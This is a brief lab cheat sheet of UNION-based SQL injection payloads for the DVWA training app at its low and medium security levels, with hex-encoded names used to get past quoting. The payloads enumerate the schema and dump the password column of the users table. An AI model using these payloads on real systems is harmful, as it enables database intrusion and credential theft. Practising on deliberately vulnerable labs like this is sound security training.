# SQL injection
<h3>low security level</h3>

- To find all tables, from a database called “dvwa”: 
`1' UNION SELECT table_name,null FROM information_schema.tables WHERE table_schema = 'dvwa'#`

 - To find all columns, from the database called “dvwa”: `1' UNION SELECT column_name,null FROM information_schema.columns WHERE table_schema ='dvwa'#`

 - To find all column names of the table named “users”, from a database called “dvwa”: `1' UNION SELECT column_name,null FROM information_schema.columns WHERE table_name = 'users' AND table_schema = 'dvwa'#`

 - To get the content of one column of the table named “users”, from a database called “dvwa”: `1' UNION SELECT password,null FROM dvwa.users#`
<h3>medium security level</h3>
 
 - To find all tables, from a database called “dvwa”: `1 union select table_name,null from information_schema.tables where table_schema = 0x64767761`
 - Note: `0x64767761` is DB name `dvwa` but decoded to hex u can use this website for decoding : https://cryptii.com/pipes/hex-decoder
 
 - To find all columns, from the database called “dvwa”: `1 UNION SELECT column_name,null FROM information_schema.columns WHERE table_schema = 0x64767761`

 - To find all column names of the table named “users”, from a database called “dvwa”: `1 UNION SELECT column_name,null FROM information_schema.columns WHERE table_name = 0x7573657273 AND table_schema = 0x64767761`

 - To get the content of one column of the table named “users”, from a database called “dvwa”: `1 UNION SELECT password,null FROM dvwa.users`
